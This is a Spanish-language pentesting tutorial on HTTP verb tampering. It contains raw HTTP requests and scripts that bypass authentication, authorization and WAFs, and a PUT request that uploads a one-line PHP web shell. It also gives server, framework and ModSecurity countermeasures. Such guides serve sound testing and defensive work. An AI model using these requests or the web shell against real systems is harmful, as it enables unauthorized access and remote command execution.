## Verb Tampering

# Guía Completa de HTTP Verb Tampering para Pentesting

## Índice
1. [Introducción](#introducción)
2. [Conceptos Fundamentales](#conceptos-fundamentales)
3. [Metodología de Testing](#metodología-de-testing)
4. [Herramientas y Técnicas](#herramientas-y-técnicas)
5. [Casos de Uso Comunes](#casos-de-uso-comunes)
6. [Evasión de Controles](#evasión-de-controles)
7. [Documentación y Reporting](#documentación-y-reporting)
8. [Contramedidas](#contramedidas)
9. [Recursos Adicionales](#recursos-adicionales)

---

## Introducción

HTTP Verb Tampering es una técnica de bypass de seguridad que explota configuraciones incorrectas en servidores web y aplicaciones que no validan apropiadamente los métodos HTTP permitidos. Esta vulnerabilidad permite a los atacantes evadir controles de acceso y restricciones de seguridad modificando el verbo HTTP utilizado en las peticiones.

### ¿Por qué es importante?
- Bypass de autenticación y autorización
- Evasión de WAFs (Web Application Firewalls)
- Acceso a funcionalidades administrativas
- Explotación de endpoints "ocultos"
- Escalación de privilegios

---

## Conceptos Fundamentales

### Métodos HTTP Estándar
- **GET**: Recuperar datos del servidor
- **POST**: Enviar datos al servidor
- **PUT**: Crear o actualizar recursos
- **DELETE**: Eliminar recursos
- **HEAD**: Obtener headers sin body
- **OPTIONS**: Consultar métodos permitidos
- **PATCH**: Actualización parcial
- **TRACE**: Diagnóstico de red
- **CONNECT**: Establecer túnel

### Métodos HTTP No Estándar
- **PROPFIND**: WebDAV - encontrar propiedades
- **PROPPATCH**: WebDAV - modificar propiedades
- **MKCOL**: WebDAV - crear colección
- **COPY**: WebDAV - copiar recurso
- **MOVE**: WebDAV - mover recurso
- **LOCK/UNLOCK**: WebDAV - bloquear recurso
- **SEARCH**: Buscar en recursos
- **DEBUG**: Depuración (Microsoft)
- **TRACK**: Similar a TRACE

### Vulnerabilidades Comunes
1. **Falta de validación de métodos**
2. **Configuraciones por defecto inseguras**
3. **Bypass de restricciones de seguridad**
4. **Inconsistencias en la implementación**

---

## Metodología de Testing

### Fase 1: Reconocimiento

#### 1.1 Identificación de Endpoints
```bash
# Escaneo inicial con nmap
nmap -p 80,443,8080,8443 --script http-methods target.com

# Identificar métodos permitidos
curl -X OPTIONS -v http://target.com/path
curl -X OPTIONS -v http://target.com/admin
```

#### 1.2 Enumeración de Rutas
```bash
# Usar herramientas como dirb, dirbuster, ffuf
ffuf -w wordlist.txt -u http://target.com/FUZZ -X OPTIONS

# Identificar endpoints administrativos
gobuster dir -u http://target.com -w admin-panels.txt
```

### Fase 2: Testing Sistemático

#### 2.1 Testing de Métodos Básicos
```http
# Test GET vs POST
GET /admin HTTP/1.1
Host: target.com

POST /admin HTTP/1.1
Host: target.com
Content-Length: 0
```

#### 2.2 Testing de Métodos Alternativos
```http
# Test con PUT
PUT /admin/users/1 HTTP/1.1
Host: target.com
Content-Type: application/json
Content-Length: 25

{"role": "administrator"}
```

```http
# Test con DELETE
DELETE /admin/users/1 HTTP/1.1
Host: target.com
```

#### 2.3 Testing con Métodos No Estándar
```http
# Test PROPFIND
PROPFIND /admin HTTP/1.1
Host: target.com
Depth: 1
Content-Length: 0
```

```http
# Test DEBUG
DEBUG /admin HTTP/1.1
Host: target.com
Command: stop-debug
```

### Fase 3: Bypass Avanzado

#### 3.1 Bypass de WAF
```http
# Método con espacios adicionales
GET  /admin HTTP/1.1
Host: target.com
```

```http
# Método en minúsculas
get /admin HTTP/1.1
Host: target.com
```

```http
# Método mixto
Get /admin HTTP/1.1
Host: target.com
```

#### 3.2 Override de Métodos
```http
# X-HTTP-Method-Override
POST /admin HTTP/1.1
Host: target.com
X-HTTP-Method-Override: PUT
Content-Length: 0
```

```http
# _method parameter
POST /admin HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

_method=DELETE
```

---

## Herramientas y Técnicas

### Herramientas Automatizadas

#### Burp Suite
1. **Intruder**: Para testing masivo de métodos
   ```
   Payload Positions: §GET§ /target HTTP/1.1
   Payloads: GET, POST, PUT, DELETE, HEAD, OPTIONS, etc.
   ```

2. **Repeater**: Para testing manual
3. **Extensions útiles**:
   - HTTP Methods Scanner
   - Verb Tampering Scanner

#### OWASP ZAP
- Active Scanner con reglas de HTTP methods
- Fuzzer para testing sistemático
- Scripts personalizados

#### Herramientas de Línea de Comandos

##### cURL - Testing Manual
```bash
# Script para testing automático
#!/bin/bash
methods=("GET" "POST" "PUT" "DELETE" "HEAD" "OPTIONS" "TRACE" "PATCH" "PROPFIND" "DEBUG")
url="http://target.com/admin"

for method in "${methods[@]}"; do
    echo "Testing $method"
    curl -X $method -v $url 2>&1 | grep -E "(HTTP/1\.|Allow:|Content-Length:)"
    echo "---"
done
```

##### HTTPie
```bash
# Testing con HTTPie
http OPTIONS target.com/admin
http PUT target.com/admin/config setting=value
http DELETE target.com/admin/users/1
```

##### Nmap Scripts
```bash
# Script personalizado para verb tampering
nmap --script http-methods,http-method-tamper target.com
```

### Scripts Personalizados

#### Python Script para Testing Masivo
```python
import requests
import sys

def test_verb_tampering(url, methods):
    results = {}
    
    for method in methods:
        try:
            response = requests.request(method, url, timeout=10)
            results[method] = {
                'status': response.status_code,
                'length': len(response.content),
                'headers': dict(response.headers)
            }
            print(f"{method}: {response.status_code} ({len(response.content)} bytes)")
        except Exception as e:
            results[method] = {'error': str(e)}
    
    return results

# Uso
methods = ['GET', 'POST', 'PUT', 'DELETE', 'HEAD', 'OPTIONS', 'TRACE', 'PATCH', 'PROPFIND']
url = sys.argv[1] if len(sys.argv) > 1 else "http://target.com/admin"
test_verb_tampering(url, methods)
```

---

## Casos de Uso Comunes

### Caso 1: Bypass de Autenticación
```http
# Acceso denegado con GET
GET /admin HTTP/1.1
Host: target.com
# Response: 401 Unauthorized

# Acceso permitido con HEAD
HEAD /admin HTTP/1.1
Host: target.com
# Response: 200 OK
```

### Caso 2: Bypass de Autorización
```http
# Usuario normal no puede eliminar
DELETE /api/users/123 HTTP/1.1
Host: target.com
Authorization: Bearer user_token
# Response: 403 Forbidden

# Pero puede con método alternativo
POST /api/users/123 HTTP/1.1
Host: target.com
X-HTTP-Method-Override: DELETE
Authorization: Bearer user_token
# Response: 200 OK
```

### Caso 3: Revelación de Información
```http
# TRACE revela headers internos
TRACE /admin HTTP/1.1
Host: target.com

# Respuesta incluye headers del servidor
HTTP/1.1 200 OK
Content-Type: message/http

TRACE /admin HTTP/1.1
Host: target.com
X-Internal-User: admin
X-Debug-Mode: enabled
```

### Caso 4: File Upload Bypass
```http
# POST bloqueado para upload
POST /upload HTTP/1.1
Host: target.com
Content-Type: multipart/form-data
# Response: 405 Method Not Allowed

# PUT permite bypass
PUT /upload/shell.php HTTP/1.1
Host: target.com
Content-Type: text/plain

<?php system($_GET['cmd']); ?>
```

---

## Evasión de Controles

### WAF Evasion Techniques

#### 1. Case Manipulation
```http
# Diferentes variaciones de case
get /admin HTTP/1.1
Get /admin HTTP/1.1
GET /admin HTTP/1.1
GeT /admin HTTP/1.1
```

#### 2. Method Overriding
```http
# Headers de override
X-HTTP-Method-Override: DELETE
X-HTTP-Method: PUT
X-Method-Override: PATCH
_method: DELETE (en body)
```

#### 3. Custom Headers
```http
# Añadir headers que confunden el WAF
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
```

#### 4. HTTP Version Manipulation
```http
# Usar diferentes versiones HTTP
GET /admin HTTP/1.0
GET /admin HTTP/2.0
```

### Bypass de Validación

#### 1. Double Method
```http
GET POST /admin HTTP/1.1
Host: target.com
```

#### 2. Method with Special Characters
```http
GET\x20/admin HTTP/1.1
Host: target.com
```

#### 3. Unicode Normalization
```http
# Usar caracteres unicode similares
GÉT /admin HTTP/1.1
Host: target.com
```

---

## Documentación y Reporting

### Estructura de Reporte

#### Resumen Ejecutivo
- **Vulnerabilidad**: HTTP Verb Tampering
- **Severidad**: Alta/Media/Baja
- **Impacto**: Bypass de controles de acceso
- **Afectados**: Endpoints específicos

#### Detalles Técnicos

##### Descripción de la Vulnerabilidad
```markdown
La aplicación no valida correctamente los métodos HTTP permitidos en el endpoint 
/admin, permitiendo bypass de autenticación mediante el uso de métodos alternativos.
```

##### Proof of Concept
```http
# Request Normal (Bloqueado)
GET /admin HTTP/1.1
Host: target.com
# Response: 401 Unauthorized

# Request con Verb Tampering (Permitido)
HEAD /admin HTTP/1.1
Host: target.com
# Response: 200 OK
```

##### Pasos para Reproducir
1. Acceder a http://target.com/admin con método GET
2. Observar respuesta 401 Unauthorized
3. Cambiar método a HEAD
4. Observar bypass exitoso con código 200

#### Clasificación de Riesgo

##### CVSS Score Calculation
- **Vector**: AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L
- **Score**: 8.6 (High)

##### Criterios de Evaluación
- **Confidencialidad**: Alta (acceso a información sensible)
- **Integridad**: Alta (modificación de datos)
- **Disponibilidad**: Baja (no afecta disponibilidad)

### Template de Documentación

```markdown
## HTTP Verb Tampering - [URL]

### Descripción
[Descripción detallada del hallazgo]

### Impacto
- [ ] Bypass de autenticación
- [ ] Bypass de autorización  
- [ ] Acceso a funciones administrativas
- [ ] Revelación de información
- [ ] Modificación de datos

### Evidencia
```http
[Request/Response de prueba]
```

### Remediation
[Recomendaciones específicas]

### Referencias
[Links a documentación adicional]
```

---

## Contramedidas

### Configuración del Servidor Web

#### Apache
```apache
# Restringir métodos permitidos
<Location "/admin">
    <LimitExcept GET POST>
        Require all denied
    </LimitExcept>
</Location>

# Deshabilitar métodos peligrosos globalmente
<Location "/">
    <Limit TRACE>
        Require all denied
    </Limit>
</Location>
```

#### Nginx
```nginx
# Restringir métodos en location específica
location /admin {
    limit_except GET POST {
        deny all;
    }
}

# Configuración de seguridad global
server {
    # Denegar métodos no permitidos
    if ($request_method !~ ^(GET|POST|HEAD)$) {
        return 405;
    }
}
```

#### IIS
```xml
<!-- web.config -->
<system.webServer>
    <security>
        <requestFiltering>
            <verbs allowUnlisted="false">
                <add verb="GET" allowed="true" />
                <add verb="POST" allowed="true" />
                <add verb="HEAD" allowed="true" />
            </verbs>
        </requestFiltering>
    </security>
</system.webServer>
```

### Configuración a Nivel de Aplicación

#### Validación de Métodos HTTP
```python
# Python/Flask ejemplo
from flask import Flask, request, abort

app = Flask(__name__)

@app.before_request
def validate_method():
    allowed_methods = {
        '/admin': ['GET', 'POST'],
        '/api/users': ['GET', 'POST', 'PUT', 'DELETE']
    }
    
    path = request.path
    method = request.method
    
    if path in allowed_methods:
        if method not in allowed_methods[path]:
            abort(405)
```

#### Framework-Specific Solutions

##### Laravel (PHP)
```php
// Middleware para validación de métodos
class ValidateHttpMethods
{
    public function handle($request, Closure $next)
    {
        $allowedMethods = [
            'admin/*' => ['GET', 'POST'],
            'api/users/*' => ['GET', 'POST', 'PUT', 'DELETE']
        ];
        
        // Validar método contra patrones permitidos
        // ... lógica de validación
        
        return $next($request);
    }
}
```

##### Express.js (Node.js)
```javascript
// Middleware para validación
const validateMethods = (req, res, next) => {
    const allowedMethods = {
        '/admin': ['GET', 'POST'],
        '/api/users': ['GET', 'POST', 'PUT', 'DELETE']
    };
    
    const path = req.path;
    const method = req.method;
    
    if (allowedMethods[path] && !allowedMethods[path].includes(method)) {
        return res.status(405).json({error: 'Method Not Allowed'});
    }
    
    next();
};

app.use(validateMethods);
```

### WAF Rules

#### ModSecurity Rules
```apache
# Bloquear métodos peligrosos
SecRule REQUEST_METHOD "@rx ^(TRACE|TRACK|DEBUG|PROPFIND)$" \
    "id:1001, \
    phase:1, \
    block, \
    msg:'Dangerous HTTP method detected', \
    logdata:'Method: %{REQUEST_METHOD}'"

# Validar métodos por ubicación
SecRule REQUEST_URI "@beginsWith /admin" \
    "id:1002, \
    phase:1, \
    chain"
SecRule REQUEST_METHOD "!@rx ^(GET|POST)$" \
    "block, \
    msg:'Invalid method for admin section'"
```

### Mejores Prácticas

#### 1. Principio de Menor Privilegio
- Permitir solo métodos necesarios
- Configurar whitelist en lugar de blacklist
- Revisar periódicamente configuraciones

#### 2. Validación Consistente
- Implementar validación en múltiples capas
- No confiar solo en el servidor web
- Validar en la aplicación también

#### 3. Monitoreo y Logging
- Registrar métodos HTTP inusuales
- Alertar sobre intentos de verb tampering
- Implementar rate limiting por método

#### 4. Testing Regular
- Incluir verb tampering en pruebas de seguridad
- Automatizar testing con CI/CD
- Realizar auditorías regulares

---

## Recursos Adicionales

### Referencias Técnicas
- [RFC 7231 - HTTP/1.1 Semantics](https://tools.ietf.org/html/rfc7231)
- [OWASP Testing Guide - HTTP Verb Tampering](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST SP 800-95 - Web Services Security](https://csrc.nist.gov/publications/detail/sp/800-95/final)

### Herramientas Útiles
- **Burp Suite**: Herramienta profesional de testing
- **OWASP ZAP**: Scanner de seguridad gratuito
- **Postman**: Testing manual de APIs
- **HTTPie**: Cliente HTTP de línea de comandos
- **curl**: Herramienta estándar para HTTP

### Wordlists y Payloads
- SecLists - HTTP Methods
- FuzzDB - HTTP Verbs
- PayloadsAllTheThings - HTTP Verb Tampering

### Laboratorios de Práctica
- DVWA (Damn Vulnerable Web Application)
- WebGoat
- bWAPP
- VulnHub VMs

### Comunidad y Recursos
- **OWASP Community**: Foros y documentación
- **PortSwigger Research**: Blog y técnicas avanzadas
- **HackerOne Reports**: Casos reales documentados
- **GitHub**: Scripts y herramientas de la comunidad











